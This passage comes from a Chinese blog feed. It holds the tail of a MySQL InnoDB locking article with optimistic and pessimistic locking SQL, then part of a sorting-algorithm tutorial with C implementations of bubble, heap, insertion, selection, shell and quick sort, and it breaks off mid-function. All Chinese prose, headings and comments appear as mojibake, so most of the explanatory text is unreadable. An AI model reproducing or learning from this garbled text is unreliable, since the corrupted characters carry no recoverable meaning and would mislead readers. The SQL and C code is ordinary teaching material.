SELECT stock FROM products WHERE id = 1 FOR UPDATE;

IF (stock &gt; 0) THEN
    UPDATE products SET stock = stock - 1 WHERE id = 1;
    -- åå»ºè®¢å...
END IF;
COMMIT;

-- ä¹è§éæ¹æ¡ï¼éåæ®éååï¼
UPDATE products 
SET stock = stock - 1, version = version + 1 
WHERE id = 1 AND version = #{version} AND stock &gt; 0;

IF (affected_rows = 1) THEN
    -- åå»ºè®¢å...
ELSE
    -- åºå­ä¸è¶³æçæ¬å²çªï¼æç¤ºç¨æ·
END IF;
</code></pre>
<p>æ¡ä¾äºï¼ç¨æ·è´¦æ·ä½é¢</p>
<pre><code class="language-sql">-- æ²è§éæ¹æ¡ï¼è½¬è´¦åºæ¯ï¼
START TRANSACTION;
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;

IF (balance &gt;= amount) THEN
    UPDATE accounts SET balance = balance - amount WHERE id = 1;
    -- è®°å½æµæ°´...
END IF;
COMMIT;

-- ä¹è§éæ¹æ¡ï¼ç§¯ååæ¢ï¼
UPDATE accounts 
SET points = points - cost, version = version + 1 
WHERE id = 1 
AND version = #{version} 
AND points &gt;= cost;
</code></pre>
<h5 id="æä½³æ¹æ¡">æä½³æ¹æ¡</h5>
<p>å®éä½¿ç¨ä¸­å¯ä»¥çæ§ä¸å¡çå²çªæ¦çæ¥ä½ä¸ºä¾æ®ä»èå¨æè°æ´éç­ç¥ã<br>
ç¨Javaå®ç°ä¸ä¸ªä½¿ç¨ä¾å­ï¼ä¸å«å®ç°ï¼ï¼</p>
<pre><code class="language-java">// æºè½ééæ©ç­ç¥
public void updateData(Data data) {
    // æ ¹æ®å²çªæ¦çå¨æéæ©éç­ç¥
    if (getConflictRate() &gt; 0.1) {  // å²çªç &gt; 10%
        // åæ¢å°æ²è§é
        usePessimisticLock(data);
    } else {
        // ä½¿ç¨ä¹è§é
        useOptimisticLock(data);
    }
}
</code></pre>
<p>å¨è¿ç§æ¹æ¡ä¸­ä¸åè¦çæ§å²çªçï¼è¿æå¶ä»éè¦å¤ççç»èç¹ã</p>
<ul>
<li><strong>çæ§å²çªçï¼æ ¹æ®å®éæåµå¨æè°æ´éç­ç¥</strong></li>
<li><strong>è®¾ç½®éè¯ä¸éï¼ä¹è§éé¿åæ ééè¯</strong></li>
<li><strong>éçº§æºå¶ï¼ä¹è§éå¤±è´¥æ¬¡æ°è¿å¤æ¶éçº§å°æ²è§é</strong></li>
<li><strong>çæ¬å·ç®¡çï¼ç¡®ä¿çæ¬å·å­æ®µçç´¢å¼ä¼å</strong></li>
<li><strong>æ­»éé¢é²ï¼æ²è§éåºæ¯ä¸æåºå®é¡ºåºå é</strong></li>
</ul>
<h3 id="æ»ç»">æ»ç»</h3>
<p>MySQL InnoDB çéä½ç³»å¯ä»¥æ¦æ¬ä¸ºâ<strong>ä¸¤ç±»ææ³ï¼æ²è§ vs ä¹è§ï¼</strong>ã<strong>ä¸ç§ç²åº¦ï¼è¡¨ãé¡µãè¡ï¼</strong>ã<strong>åç§å¸¸ç¨ç®æ³ï¼Record / Gap / Next-Key / Insert Intentionï¼</strong>âã<br>
çè§£å®ä»¬çæ ¸å¿æ¯æä½ä¸¤æ¡ä¸»çº¿ï¼</p>
<ol>
<li><strong>éç¦»çº§å«å³å®éçâèå´âââRR ç¨ Next-Key Lock é²å¹»è¯»ï¼RC ç¨ Record Lock æå¹¶åï¼</strong></li>
<li><strong>ç´¢å¼å³å®éçâä½ç½®âââéæ°¸è¿å å¨ç´¢å¼ä¸ï¼æ ç´¢å¼åéåä¸ºè¡¨éæéèèç°ç´¢å¼éã</strong></li>
</ol>
<p>å®ééåæ¶ï¼åéåå²çªæ¦çä¸ä¸è´æ§è¦æ±ï¼</p>
<ul>
<li>å²çªé«ãä¸´çåºé¿ãå¼ºä¸è´ â æ²è§éï¼FOR UPDATE / LOCK TABLESï¼ï¼</li>
<li>å²çªä½ãè¯»å¤åå°ãå¯éè¯ â ä¹è§éï¼CAS+çæ¬å·/æ¶é´æ³ï¼ã</li>
</ul>
<p>æåå«å¿äºçæ§ï¼æâå²çªçãæ­»éæ¬¡æ°ãéè¯æåçâåæä»ªè¡¨çï¼è®©éç­ç¥éä¸å¡æµéå¨æä¼¸ç¼©ï¼ææ¯çæ­£çâé«å¹¶åæ­£ç¡®å§¿å¿âã</p>

</div>
<div id="MySignature" role="contentinfo">
    <div style="float:left;letter-spacing: 1px;font-size: 13px;"><p><strong>ä½èï¼</strong><a href="http://www.cnblogs.com/jimoer/">çºªè«</a>
<br>æ¬¢è¿ä»»ä½å½¢å¼çè½¬è½½ï¼ä½è¯·å¡å¿æ³¨æåºå¤ã<br>
éäºæ¬äººæ°´å¹³ï¼å¦ææç« åä»£ç æè¡¨è¿°ä¸å½ä¹å¤ï¼è¿è¯·ä¸åèµæã</p>
<!-- åäº«å¾æ å¼å§ -->
<p>æ¬¢è¿æ«æäºç»´ç å³æ³¨å¬ä¼å·ï¼<strong>Jimoer</strong></p>
<p>æç« ä¼åæ­¥å°å¬ä¼å·ä¸é¢ï¼å¤§å®¶ä¸èµ·æé¿ï¼å±åæåææ¯è½åã</p>
<p><strong>å£°æ´åä¸»ï¼</strong>å¦ææ¨è§å¾æç« å¯¹æ¨æå¸®å©ï¼å¯ä»¥ç¹å»æç« å³ä¸è§ã<a onclick="pepleFavourite();" href="javascript:void(0);" style="font-size: 14pt;">æ¨è</a>ãä¸ä¸ã</p>
<p>æ¨çé¼å±æ¯åä¸»çæå¤§å¨åï¼</p>
</div>
<div style="float:right;">
<img src="https://img2018.cnblogs.com/blog/772743/201909/772743-20190904004009398-659676330.png" alt="å¾®ä¿¡å¬ä¼å·"></div>
<!-- åäº«å¾æ ç»æ -->
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 20:20">2026-01-20 20:20</span>&nbsp;
<a href="https://www.cnblogs.com/jimoer">çºªè«</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508695);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508695', targetLink: 'https://www.cnblogs.com/jimoer/p/19508695', title: 'ææ¯é¢ï¼MySQLç¯ï¼InnoDBçéæºå¶ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãæåºç®æ³å¨è§£æï¼ä»åºç¡å°ä¼åï¼ä¸æåéå«å¤§æåºï¼ã ]]></title>
    <link>https://www.cnblogs.com/niukwuy/p/19507074/sort-algorithms-full-guide</link>
    <guid>407b8239e3c439d0cdeec09741a95432</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/niukwuy/p/19507074/sort-algorithms-full-guide" title="åå¸äº 2026-01-20 20:19">
    <span role="heading" aria-level="2">ãæåºç®æ³å¨è§£æï¼ä»åºç¡å°ä¼åï¼ä¸æåéå«å¤§æåºï¼ã</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æè¯¦è§£åæ³¡ãéæ©ãæå¥ç­åºç¡æåºï¼ä»¥åå¿«æãå½å¹¶ãå æãå¸å°ç­é«çº§æåºçåçãcè¯­è¨ä»£ç å®ç°ï¼å¯¹æ¯åç®æ³æ¶é´å¤æè¯»/ç©ºé´å¤æåº¦ï¼éä»£ç è¯¦ç»æ³¨éï¼å¸®ä½ å½»åºæææåºï¼
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ä¸ä¸ºä»ä¹æä»¬éè¦è¯»ææåº--ä¸æ­¢äºæé¡ºåºçæ ¸å¿ä»·å¼">ä¸ãä¸ºä»ä¹æä»¬éè¦è¯»ææåº--ä¸æ­¢äº"æé¡ºåº"çæ ¸å¿ä»·å¼</h1>
<p>æåºæ¯è®¡ç®æºç§å­¦ä¸­æåºç¡ä¹æ¯ææ ¸å¿çæä½ä¹ä¸ï¼çä¼¼åªæ¯å°æ°æ®æææåºï¼å®åè´¯ç©¿æä»¬çæ´»ä¸­çæ¯ä¸ªè§è½ï¼æ¼å¤å¤ä¸çä»·æ ¼æåºï¼æç´¢å¼æä¸çæéæåºï¼çè³æ¯æå¸¸è§çææºç¸åä¸çæ¶é´æåºèåé½ä¾èµçæåºç®æ³çæ¯æ<br>
ä½å¤§å¤æ°åå­¦èå¾å¾ä¼é·å¥"æ­»è®°ä»£ç "çè¯¯åºï¼èå¿½ç¥äºæåºçæ¬è´¨--éè¿é«æçæ¯è¾ä¸äº¤æ¢ï¼éä½æ°æ®çæ åºåº¦</p>
<h3 id="æ¬æå°ä»æåºç®æ³çè®¾è®¡æè·¯åºå±åçæ¶é´å¤æåº¦ä»¥åéç¨åºæ¯æ¥å¸®ä½ å½»åºæææåº">æ¬æå°ä»æåºç®æ³çè®¾è®¡æè·¯ï¼åºå±åçï¼æ¶é´å¤æåº¦ä»¥åéç¨åºæ¯æ¥å¸®ä½ å½»åºæææåº</h3>
<h3 id="æ ¸å¿å¯¹æ¯æ»è¡¨">æ ¸å¿å¯¹æ¯æ»è¡¨:</h3>
<p><img alt="å±å¹æªå¾ 2026-01-20 172516" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120200103129-100142023.png" class="lazyload"></p>
<h1 id="äºå¿å­¦æåºç®æ³åºå±é»è¾ä»£ç å®ç°éä¸è¯¦ç»æ³¨é">äºãå¿å­¦æåºç®æ³:åºå±é»è¾+ä»£ç å®ç°(éä¸è¯¦ç»æ³¨é)</h1>
<p>æ³¨:ä»¥ä¸æåºé»è®¤æ¯æååº</p>
<h2 id="åæ³¡æåº">åæ³¡æåº</h2>
<h3 id="æ ¸å¿ææ³">æ ¸å¿ææ³:</h3>
<p>éè¿éå¤çéåæ°ç»ï¼æ¯æ¬¡æ¯è¾ä¸¤ä¸¤ç¸é»çæ°æ®ï¼è¥é¡ºåºæ­£ç¡®å°±ä¸äº¤æ¢ï¼é¡ºåºéè¯¯å°±äº¤æ¢ï¼æ¯æ¬¡éåå°±å®æä¸ä¸ªæ°æ®çæåº(æåä¸ä¸ªæ°æ®æä¸ºæå¤§/æå°çæ°æ®)</p>
<h3 id="ç¹ç¹">ç¹ç¹ï¼</h3>
<p>ç¨³å®æåº(ç¸ç­åç´ é¡ºåºä¸å)ï¼æ¶é´å¤æåº¦O(N^2)ï¼ç©ºé´å¤æåº¦O(1)</p>
<h3 id="éç¨åºæ¯">éç¨åºæ¯:</h3>
<p>æ å®è·µæä¹ï¼ä»ææå­¦æä¹</p>
<h3 id="æ¶é´å¤æåº¦">æ¶é´å¤æåº¦:</h3>
<p>èèæåçæåµ:éåº<br>
åè®¾ænä¸ªæ°æ®ï¼ç¬¬ä¸ä¸ªæ°æ®æå¤§ï¼éè¿ä¸¤ä¸¤äº¤æ¢ï¼è¦äº¤æ¢n-1æ¬¡æè½äº¤æ¢å°æåä¸ä¸ªï¼æ­¤æ¶æ¬¡å¤§çæ°æ®è¢«äº¤æ¢å°ç¬¬ä¸ä¸ªï¼æåä¸ä¸ªæ°æ®å·²ç»ç¡®å®ï¼æä»¥è¦äº¤æ¢n-2æ¬¡æè½äº¤æ¢å°åæ°ç¬¬äºä¸ªï¼ä¾æ¬¡ç±»æ¨ï¼å®éä¸æ¯ä¸ä¸ªç­å·®æ°å(n-1+n-2+n-3+â¦â¦+1) = (n(n-1))/2ï¼ææ¶é´å¤æåº¦ä¸ºO(N^2)</p>
<h3 id="ä»£ç å®ç°">ä»£ç å®ç°ï¼</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void Swap(int* x, int* y) {
	int tmp = *x;
	*x = *y;
	*y = tmp;
}

void BubbleSort(int* a, int size) {
	for (int j = 0; j &lt; size; j++) {
		int Flag = 0;
		for (int i = 0; i &lt; size - j - 1; i++) {
			if (a[i] &gt; a[i + 1]) {
				Flag = 1;
				Swap(&amp;a[i], &amp;a[i + 1]);
			}
		}
                //æ­¤æ¶ä¸æ¬¡éåæ²¡æä¸¤ä¸¤äº¤æ¢ï¼è¯´æå·²ç»æåºäº
		if (Flag == 0) {
			break;
		}
	}
}
</code></pre>
</details>
<h2 id="å æåº">å æåº</h2>
<h3 id="æ ¸å¿ææ³-1">æ ¸å¿ææ³:</h3>
<p>åç¨åä¸è°æ´æ³å»ºå¤§å ï¼æ­¤æ¶å é¡¶åç´ æ¯æå¤§çæ°æ®ï¼ç¶åä¸æåä¸ä¸ªåç´ äº¤æ¢ï¼æåä¸ä¸ªåç´ åæäºæå¤§çæ°æ®ï¼æ³¨æsize--ï¼ååä¸è°æ´æ³å»ºå ï¼å¯»æ¾æ¬¡å¤§çåç´ ï¼ç»§ç»­äº¤æ¢ï¼ä¾æ¬¡ç±»æ¨â¦â¦</p>
<h3 id="ç¹ç¹-1">ç¹ç¹:</h3>
<p>ä¸ç¨³å®æåº(ä¼è¿è¡è·¨ä½ç½®äº¤æ¢ï¼å¯è½æä¹±åç¸ç­æ°æ®çç¸å¯¹ä½ç½®)ï¼æ¶é´å¤æåº¦ä¸ºO(N*logN)ï¼ç©ºé´å¤æåº¦ä¸ºO(1)</p>
<h3 id="éç¨åºæ¯-1">éç¨åºæ¯:</h3>
<p>æ°æ®éè¾å¤§ä¸ä¸éè¦æåºç»æç¨³å®çåºæ¯<br>
å¯ä»¥è§£å³TopKé®é¢</p><details><p></p>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void GiveFile() {
      //å»ºç«æä»¶
	const char* filepath = "randomdata.txt";
	FILE* fin = fopen(filepath, "w");
	if (fin == NULL) {
		perror("fopen():error");
		return ;
	}
	int size = 100000;
	for (int i = 0; i &lt; size; i++) {
		int random = rand() + i;
		fprintf(fin, "%d\n", random);
	}
	fclose(fin);
}

void FindTopK() {
	const char* filepath = "randomdata.txt";
	FILE* fout = fopen(filepath, "r");
	if (fout == NULL) {
		perror("fopen():error");
		return;
	}
	int k = 0;
	printf("è¯·è¾å¥k:\n");
	scanf("%d", &amp;k);
	//å°åkä¸ªæ°æ¾è¿äºæ°ç»ä¸­
	int* a = (int*)malloc(k * sizeof(int));
	if (a == NULL) {
		perror("malloc fail");
		return;
	}
	for (int i = 0; i &lt; k; i++) {
		fscanf(fout, "%d", &amp;a[i]);
	}
	//è°æå°å 
	for (int i = (k - 2) / 2; i &gt;= 0; i--) {
		AdjustDown(a, k, i);
	}
	//å°æä»¶ä¸­çæ°æ®ä¾æ¬¡ä¸å é¡¶æ°æ®æ¯è¾
	int tmp = 0;
	while (fscanf(fout, "%d", &amp;tmp)==1) {
		if (tmp &gt; a[0]) {
			a[0] = tmp;
			AdjustDown(a, k, 0);
		}
	}
	//è¿ä¸ªæ¶åå·²ç»è·å¾äºåkå¤§çæ°ï¼ä½ä¸ååå
	int tmpk = k;
	//æåä¸æ¬¡æå¥åæ´ä½ä¸ä¸å®æ»¡è¶³å°å 
	AdjustDown(a, k, 0);
	//è¿ä¸ªæ¶åå·²ç»æ»¡è¶³å°å ï¼ç¨å æåº
	for (int i = 0; i &lt; tmpk;i++) {
		Swap(&amp;a[0], &amp;a[k - 1]);
		k--;
		AdjustDown(a, k, 0);
	}
	for (int i = 0; i &lt; tmpk; i++) {
		printf("%d ", a[i]);
	}
	fclose(fout);
}

//æ¾åº10ä¸ä¸ªæ°ä¸­åkå¤§çæ°
int main() {
	srand((unsigned int)time(NULL));
	//æ¹æ³ä¸:å»ºç«å¤§å ï¼åå é¡¶çæ°æ®ï¼ç¶åpopï¼ç¨åä¸è°æ´ç®æ³ä½¿å é¡¶æ°æ®æä¸ºç¬¬äºå¤§çï¼ç»§ç»­åâ¦â¦
	//è¿æ ·çé®é¢æ¯ç©ºé´å¤æåº¦ä¸ºO(N)

	//æ¹æ³äº:å»ºç«åkä¸ªæ°çå°å ï¼åæåkä¸ªæ°æ¾è¿å»ï¼ç¶åå°å©ä¸çæ°æ®ä¾æ¬¡ä¸å é¡¶æ°æ®æ¯è¾ï¼å¦ææ¯å é¡¶æ°æ®å¤§ï¼è¿æ ï¼ç¶åç¨åä¸è°æ´æ³è°æå°å 
	//æåå éçkä¸ªåç´ å°±æ¯åkå¤§çæ°(ä¸åé¡ºåº)
	//è¿å¯ä»¥åç¨ä¸æ¬¡åä¸è°æ´æ³è°æ´è³å°å ï¼åç¨å æåº
	GiveFile();
	FindTopK();
	return 0;
}
</code></pre>
</details>
<h3 id="æ¶é´å¤æåº¦-1">æ¶é´å¤æåº¦:</h3>
<p>åä¸è°æ´å»ºå :</p>
<p><img alt="å±å¹æªå¾ 2026-01-20 110150" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120111553875-1756107725.png" class="lazyload"><br>
æåº:</p>
<p><img alt="å±å¹æªå¾ 2026-01-20 111515" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120111618916-1656485626.png" class="lazyload"></p>
<h3 id="ä»£ç å®ç°-1">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void AdjustDwon(int* a, int size, int parent) {
	int morechild = 2 * parent + 1;
	while (morechild &lt; size) {
		//æ¾å°è¾å¤§å­èç¹
		if (morechild + 1 &lt; size &amp;&amp; a[morechild] &lt; a[morechild + 1]) {
			morechild++;
		}
		if (a[morechild] &gt; a[parent]) {
			Swap(&amp;a[morechild], &amp;a[parent]);
			parent = morechild;
			morechild = 2 * parent + 1;
		}
		else {
			break;
		}
	}
}

//æ¶é´å¤æåº¦ä¸ºO(N*logN)
void HeapSort(int* a, int size) {
	//åç¨åä¸è°æ´æ³å»ºå¤§å 
	int parent = (size - 2) / 2;
	while(parent &gt;= 0) {
		AdjustDwon(a, size, parent);
		parent--;
	}
	int tmpsize = size;
	for (int i = 0; i &lt; tmpsize; i++) {
		Swap(&amp;a[0], &amp;a[size - 1]);
		size--;
		AdjustDwon(a, size, 0);
	}
}
</code></pre>
</details>
<h2 id="æå¥æåº">æå¥æåº</h2>
<h3 id="æ ¸å¿ææ³-2">æ ¸å¿ææ³:</h3>
<p>endåé¢çæ°æ®å·²ç»å®ç°äºæåºï¼æ°æå¥çæ°æ®éè¦ä¸åé¢çæ°æ®ä¾æ¬¡æ¯è¾ï¼å¦ææ°æ°æ®è¾å°ï¼é£ä¹åæ¥çæ°æ®å¾åæªï¼ç´å°æ°æ°æ®æ¯åæ°æ®å¤§ä¸ºæ­¢ï¼ä»èå®ç°äºæåº</p>
<h3 id="ç¹ç¹-2">ç¹ç¹:</h3>
<p>ç¨³å®æåºï¼æ¶é´å¤æåº¦ä¸ºO(N<sup>2),éåºæ§è¾å¥½(å®éä¸å¾å¾ä»äºO(N</sup>2)ä¸O(N)ä¹é´)ï¼ç©ºé´å¤æåº¦ä¸ºO(1)</p>
<h3 id="éç¨åºæ¯-2">éç¨åºæ¯:</h3>
<p>å°è§æ¨¡æ°æ®æåº(å¦å¿«æçå°åºé´ä¼å)ï¼è¿ä¼¼æåºæ°æ®æåº</p>
<h3 id="æ¶é´å¤æåº¦-2">æ¶é´å¤æåº¦:</h3>
<p><img alt="å±å¹æªå¾ 2026-01-20 114001" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120114022226-1298318495.png" class="lazyload"></p>
<h3 id="ä»£ç å®ç°-2">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void InsertSort(int* a, int size) {
	//endåé¢çå·²ç»æ¯æåºäºï¼ç¶åå°end+1ä¸åé¢çä¾æ¬¡æ¯è¾
	for (int i = 0; i &lt; size - 1; i++) {
		int end = i;
		int tmp = a[end + 1];
		while (end &gt;= 0) {
			if (tmp &lt; a[end]) {
				a[end + 1] = a[end];
				end--;
			}
			else {
				break;
			}
		}
		a[end + 1] = tmp;
	}
}
</code></pre>
</details>
<h2 id="éæ©æåº">éæ©æåº</h2>
<h3 id="æ ¸å¿ææ³-3">æ ¸å¿ææ³:</h3>
<p>å¤æ¬¡éåï¼æ¾å°æå¤§å¼ä¸æå°å¼ï¼å°æå¤§å¼ä¸æ«å°¾å¼äº¤æ¢ï¼å°æå°å¼ä¸å¼å¤´å¼äº¤æ¢</p>
<h3 id="ç¹ç¹-3">ç¹ç¹:</h3>
<p>ä¸ç¨³å®æåº(æ¶åè·¨ä½ç½®äº¤æ¢)ï¼æ¶é´å¤æåº¦ä¸ºO(N^2)ï¼ç©ºé´å¤æåº¦ä¸ºO(1)</p>
<h3 id="éç¨åºæ¯-3">éç¨åºæ¯:</h3>
<p>æ å®éæä¹ï¼ä»ææå­¦æä¹</p>
<h3 id="æ¶é´å¤æåº¦-3">æ¶é´å¤æåº¦:</h3>
<p><img alt="å±å¹æªå¾ 2026-01-20 115900" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120115913603-65970760.png" class="lazyload"></p>
<h3 id="éç¨åºæ¯-4">éç¨åºæ¯:</h3>
<p>éåºæ§å·®ï¼æ æ³å¤æ­æ¯å¦æåºï¼æ¶é´å¤æåº¦ä¸è¬é½å¨O(N^2)ï¼ä»å·ææå­¦æä¹</p>
<h3 id="ä»£ç å®ç°-3">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void SelectSort(int* a, int size) {
	int begin = 0;
	int end = size - 1;
	//å°æå¤§ä¸æå°åå«æ¾å¨ä¸¤è¾¹
	while (begin &lt;= end) {
		int mini = begin;
		int maxi = begin;
		for (int i = begin + 1; i &lt;= end; i++) {//åºè¯¥æ¯&lt;=
			if (a[i] &gt; a[maxi]) {
				maxi = i;
			}
			if (a[i] &lt; a[mini]) {
				mini = i;
			}
		}
		Swap(&amp;a[begin], &amp;a[mini]);//åºè¯¥ç¨äº¤æ¢å½æ°ï¼å¦åä¼è¦ç
		if (begin == maxi)
			maxi = mini;//è¿ébeginå¯è½ä¸maxiç¸åï¼miniçå¼å°±ä¼è¢«äº¤æ¢èµ°ï¼
		//è¿éå³ä½¿end==miniä¹æ²¡å³ç³»ï¼å ä¸ºä¸å½±åååºçæåº
		Swap(&amp;a[end], &amp;a[maxi]);
		begin++;
		end--;
	}
}
</code></pre>
</details>
<h2 id="å¸å°æåº">å¸å°æåº</h2>
<h3 id="æ ¸å¿ææ³-4">æ ¸å¿ææ³:</h3>
<p>å¶åºå±ä»ç¶æ¯æå¥æåºï¼ä½æå¥æåºæä¸ä¸ªç¼ºç¹:å¨å¤çéåºææ¥è¿éåºçæ¶åæ¶é´å¤æåº¦åé«ï¼æä»¥å¨æå¥æåºååè¿è¡é¢æåºï¼ä½¿å¤§çæ°å°½éæå¨åé¢</p>
<h3 id="ç¹ç¹-4">ç¹ç¹:</h3>
<p>ä¸ç¨³å®æåºï¼æ¶é´å¤æåº¦çº¦ä¸ºO(N^(1.3))ï¼ç©ºé´å¤æåº¦ä¸ºO(1)</p>
<h3 id="éç¨åºæ¯-5">éç¨åºæ¯:</h3>
<p>ä¸­ç­è§æ¨¡æ°æ®çé«ææåºï¼ä¸å¯¹åå­æ¶èè¦æ±è¾ä½</p>
<h3 id="æ¶é´å¤æåº¦-4">æ¶é´å¤æåº¦:</h3>
<p>å¸å°æåºçæ¶é´å¤æåº¦åå¢éåºåçå½±åè¾å¤§ï¼éæ©åéçå¢éåºåå¯ä»¥æ¾èæé«æåºæçãä½èæ°´å¹³æéï¼æ æ³æ¨å¯¼</p>
<h3 id="ä»£ç å®ç°-4">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void ShellSort(int* a, int size) {
	//åé¢æåº,æå¤§çæ°æ®å¾åè¾¹æ¾ï¼æå°çæ°æ®å¾åæª
	int gap = size;//å½gap=1æ¶å°±è·æå¥æåºæ¯ä¸æ ·ç
	while (gap&gt;1) {
		gap = gap / 3 + 1;//å 1çç®çæ¯ä¿è¯æåä¸æ¬¡gap=1ï¼ä»èå®ç°æå¥æåº
		for (int j = 0; j &lt; gap; j++) {
			for (int i = j; i &lt; size - gap; i += gap) {
				int end = i;
				int tmp = a[end + gap];
				while (end &gt;= 0) {
					if (a[end] &gt; tmp) {
						a[end + gap] = a[end];
						end -= gap;
					}
					else {
						break;
					}
				}
				a[end + gap] = tmp;
			}//è¿å±å¾ªç¯æ¯æ§å¶ä»¥gapä¸ºä¸ç»çäº¤æ¢
		}//å¾ªç¯gapæ¬¡ï¼æææçç»é½æå¥äº¤æ¢ä¸æ¬¡
	}//å¤æ¬¡ä»¥ä¸åçgapå¼é¢æåºï¼æågap==1ï¼æå¥æåº
}
</code></pre>
</details>
<h2 id="å¿«æ">å¿«æ</h2>
<h3 id="æ ¸å¿ææ³-5">æ ¸å¿ææ³:</h3>
<p><img alt="å±å¹æªå¾ 2026-01-20 143202" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120143227394-2027358524.png" class="lazyload"></p>
<p><img alt="å±å¹æªå¾ 2026-01-20 151336" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120151359493-783827895.png" class="lazyload"></p>
<p>åè¶å¿«æ(ä»£ç å®ç°):</p><details><p></p>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>//éå°çåè¶å¿«æ
int QuickSort1(int* a, int left, int right) {
	int mid = GetMid(a, left, right);
	int key = left;
	Swap(&amp;a[key], &amp;a[mid]);
	int begin = left;
	int end = right;
	while (begin &lt; end) {
		while (begin &lt; end &amp;&amp; a[end] &gt;= a[key]) {
			end--;
		}
		while (begin &lt; end &amp;&amp; a[begin] &lt;= a[key]) {
			begin++;
		}
		Swap(&amp;a[begin], &amp;a[end]);
	}
	Swap(&amp;a[key], &amp;a[begin]);
	return begin;
}

//åæéæ³çåè¶å¿«æ
int QuickSort2(int* a, int left,int right) {
	int key = left;
	int prev = left;
	int cur = left + 1;
    //curæéæ¯ä¸ºäºæ¾æ¯keyå°çæ°ï¼æ¾å°äºå°±å++prevç¶åä¸preväº¤æ¢æ°æ®ï¼cur++ï¼æ²¡æ¾å°å°±cur++ï¼prevä¸å¨    
	while(cur&lt;=right) {
		if (a[cur] &lt; a[key] &amp;&amp; ++prev != cur) {
			Swap(&amp;a[cur], &amp;a[prev]);
		}
		cur++;
	}
	Swap(&amp;a[key], &amp;a[prev]);
	return prev;
}

</code></pre>
</details>
<h3 id="ç¹ç¹-5">ç¹ç¹:</h3>
<p>ä¸ç¨³å®æåºï¼æ¶é´å¤æåº¦ä¸ºO(N*logN)ï¼ç©ºé´å¤æåº¦ä¸ºO(1)</p>
<h3 id="éç¨åºæ¯-6">éç¨åºæ¯:</h3>
<p>åå­ä¸­æ°æ®çé«ææåºï¼ä¸å¯¹æåºç¨³å®æ§æ²¡æè¦æ±</p>
<h3 id="æ¶é´å¤æåº¦-5">æ¶é´å¤æåº¦:</h3>
<p>æ³¨:é»è®¤æåµæ¯éæå·¦è¾¹çæ°å­ä½ä¸ºkey</p>
<p>æä¼æåµ:æ¯æ¬¡ékeyé½éå°ä¸­é´æ°å­ï¼å³æ¯æ¬¡ç­é¿åååºé´</p>
<p><img alt="å±å¹æªå¾ 2026-01-20 144035" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120144059073-38282439.png" class="lazyload"><br>
æ­¤æ¶å°±å¦åæ ä¸è¬ï¼éå½æ·±åº¦ä¸ºlogNï¼æ¯å±é½éè¦éåä¸éï¼æ¶é´ä¸ºO(N)ï¼ææ¶é´å¤æåº¦ä¸ºO(N*logN)</p>
<p>æåæåµ:æ¯æ¬¡é½éå°æå¤§æèæå°çæ°ä½ä¸ºkeyï¼æ¯æ¬¡ååä¼å¾å°é¿åº¦ä¸ºn-1å0çå­æ°ç»ï¼æ­¤æ¶éå½çå±æ°ä¸ºNå±ï¼æ¯å±æ¶é´ä¸ºO(N)ï¼ææ¶é´å¤æåº¦ä¸ºO(N^2)<br>
ç±æ­¤å¯è§:ékeyæ¯éä¸­ä¹éï¼ä¸é¢ä»ç»ä¸¤ç§æ¹å¼ä¼åékeyçæ¹å¼<br>
1ãéæºæ°ékey:å©ç¨éæºæ°ékeyï¼æå¤§æ¦çä¸é¿åäºkeyéå°æç«¯å¼(æå¤§ææå°)çæåµ<br>
2ãä¸è¾åä¸­æ³ékey:ä»æå·¦è¾¹åæå³è¾¹åä¸­é´éä¸ä¸ªä¸­é´çæ°ï¼è¿æ ·æ°¸è¿ä¸å¯è½éå°æå°ææå¤§çæ°äº<br>
ä»£ç å®ç°:</p><details><p></p>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>int GetMid(int*a,int left, int right) {
	int mid = (left + right) / 2;
	if (a[left] &gt; a[right]) {
		if (a[right] &gt; a[mid])
			return right;
		else if (a[mid] &gt; a[left])
			return left;
		else
			return mid;
	}
	else {
		if (a[left] &gt; a[mid])
			return left;
		else if (a[mid] &gt; a[right])
			return right;
		else
			return mid;
	}
}

</code></pre>
</details>
<h3 id="ä»£ç å®ç°-5">ä»£ç å®ç°:</h3>
<p>éå½ç:</p>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void QuickSort(int* a, int left, int right) {
	if (left &gt;= right)
		return;
